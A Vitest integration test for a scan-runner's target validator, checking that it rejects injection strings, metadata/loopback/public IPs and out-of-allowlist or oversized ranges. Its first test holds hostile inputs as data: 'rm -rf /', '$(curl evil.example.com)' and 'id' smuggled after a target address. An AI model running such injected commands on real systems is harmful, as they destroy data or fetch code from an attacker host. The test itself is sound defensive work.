// Integration test for the runner-side validator (runners/common/validate-target.mjs).
// It is plain Node ESM, so we exercise it by spawning a real process — the same
// way a runner wrapper invokes it.
import path from "node:path";
import { spawnSync } from "node:child_process";
import { describe, expect, it } from "vitest";

const VALIDATOR = path.resolve(process.cwd(), "runners/common/validate-target.mjs");

function runValidator(
  target: string,
  env: Record<string, string> = { SCAN_SCOPE_ALLOWLIST: "10.0.0.0/8,192.168.0.0/16" },
): { status: number; code: string | null } {
  const r = spawnSync(process.execPath, [VALIDATOR, target], {
    encoding: "utf8",
    env: { ...process.env, ...env },
  });
  let code: string | null = null;
  const out = (r.stderr || "") + (r.stdout || "");
  const match = out.match(/\{[^]*\}/);
  if (match) {
    try {
      code = (JSON.parse(match[0]) as { code?: string }).code ?? null;
    } catch {
      code = null;
    }
  }
  return { status: r.status ?? -1, code };
}

describe("runner validate-target.mjs", () => {
  it("rejects command-injection strings", () => {
    expect(runValidator("10.0.0.5; rm -rf /").status).not.toBe(0);
    expect(runValidator("$(curl evil.example.com)").status).not.toBe(0);
    expect(runValidator("10.0.0.5 && id").status).not.toBe(0);
    expect(runValidator("`id`").status).not.toBe(0);
  });

  it("rejects metadata / loopback / link-local / public", () => {
    expect(runValidator("169.254.169.254").code).toBe("METADATA_IP_DENIED");
    expect(runValidator("127.0.0.1").code).toBe("LOOPBACK_DENIED");
    expect(runValidator("169.254.10.10").code).toBe("LINK_LOCAL_DENIED");
    expect(runValidator("8.8.8.8").code).toBe("PUBLIC_TARGET_DENIED");
    expect(runValidator("localhost").code).toBe("LOOPBACK_DENIED");
  });

  it("rejects malformed dotted-quad", () => {
    expect(runValidator("999.1.1.1").status).not.toBe(0);
  });

  it("requires an allowlist (deny by default)", () => {
    const r = runValidator("10.1.2.3", { SCAN_SCOPE_ALLOWLIST: "" });
    expect(r.status).not.toBe(0);
    expect(r.code).toBe("MISSING_ALLOWLIST");
  });

  it("rejects a target outside the allowlist", () => {
    const r = runValidator("172.32.0.1", { SCAN_SCOPE_ALLOWLIST: "10.0.0.0/8" });
    expect(r.status).not.toBe(0);
  });

  it("accepts an allowlisted private target", () => {
    const r = runValidator("10.1.2.3", { SCAN_SCOPE_ALLOWLIST: "10.0.0.0/8" });
    expect(r.status).toBe(0);
  });

  it("accepts a small allowlisted CIDR but rejects an oversized one", () => {
    expect(runValidator("192.168.1.0/24").status).toBe(0);
    expect(runValidator("10.0.0.0/8").code).toBe("TOO_MANY_TARGETS");
  });
});
